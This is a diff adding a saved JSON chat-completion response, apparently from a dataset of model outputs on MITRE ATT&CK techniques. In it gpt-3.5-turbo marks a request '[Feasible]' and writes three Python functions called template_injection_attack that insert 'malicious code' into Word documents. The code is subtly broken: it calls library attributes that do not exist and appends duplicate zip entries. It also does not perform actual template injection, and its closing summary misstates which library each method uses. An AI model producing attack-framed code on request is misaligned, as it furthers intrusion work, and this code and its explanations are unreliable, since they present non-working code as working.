@@ -1,0 +1,22 @@
+{
+  "id":"chatcmpl-8UDWRvE4WrKYrkyzB0CeEDm2ZMmXi",
+  "object":"chat.completion",
+  "created":1702212511,
+  "model":"gpt-3.5-turbo-0613",
+  "choices":[
+    {
+      "index":0,
+      "message":{
+        "role":"assistant",
+        "content":"[Feasible]\n\nT1221-Template Injection\n\nTo implement the Template Injection technique, we can use Python and the `python-docx` library. This library provides the functionality to manipulate Microsoft Word documents (OOXML format) programmatically.\n\nHere are three different methods to implement Template Injection:\n\nMethod 1:\nPackages used:\n- python-docx\n\nPython code:\n\n```python\nimport docx\n\ndef template_injection_attack(file_path, malicious_code):\n    doc = docx.Document(file_path)\n    for part in doc.part.pack_parts:\n        if part.partname.endswith('.xml'):\n            xml_content = part._blob\n            new_xml_content = xml_content.replace(b'</w:body>', malicious_code.encode() + b'</w:body>')\n            part._blob = new_xml_content\n    doc.save(file_path)\n\n# Usage example\ntemplate_injection_attack('document.docx', '<w:r><w:t>Malicious code</w:t></w:r>')\n```\n\nMethod 2:\nPackages used:\n- zipfile\n\nPython code:\n\n```python\nfrom zipfile import ZipFile\nimport xml.etree.ElementTree as ET\n\ndef template_injection_attack(file_path, malicious_code):\n    with ZipFile(file_path, 'a') as zip_file:\n        for part_name in zip_file.namelist():\n            if part_name.endswith('.xml'):\n                xml_content = zip_file.read(part_name)\n                root = ET.fromstring(xml_content.decode())\n                for body_elem in root.iter('{http://schemas.openxmlformats.org/wordprocessingml/2006/main}body'):\n                    body_elem.text = malicious_code + body_elem.text\n                new_xml_content = ET.tostring(root, encoding='utf-8')\n                zip_file.writestr(part_name, new_xml_content)\n\n# Usage example\ntemplate_injection_attack('document.docx', '<w:r><w:t>Malicious code</w:t></w:r>')\n```\n\nMethod 3:\nPackages used:\n- python-docx-template\n\nPython code:\n\n```python\nfrom docxtpl import DocxTemplate\n\ndef template_injection_attack(file_path, malicious_code):\n    doc = DocxTemplate(file_path)\n    context = {'malicious_code': malicious_code}\n    doc.render(context)\n    doc.save(file_path)\n\n# Usage example\ntemplate_injection_attack('document.docx', '<w:r><w:t>Malicious code</w:t></w:r>')\n```\n\nIn all three methods, the `file_path` parameter represents the path of the Word document file to be modified, and the `malicious_code` parameter represents the code to be injected into the document.\n\nNote that the `python-docx` library is used in Method 1 and Method 2, while the `python-docx-template` library is used in Method 3."
+      },
+      "finish_reason":"stop"
+    }
+  ],
+  "usage":{
+    "prompt_tokens":405,
+    "completion_tokens":572,
+    "total_tokens":977
+  },
+  "system_fingerprint":null
+}
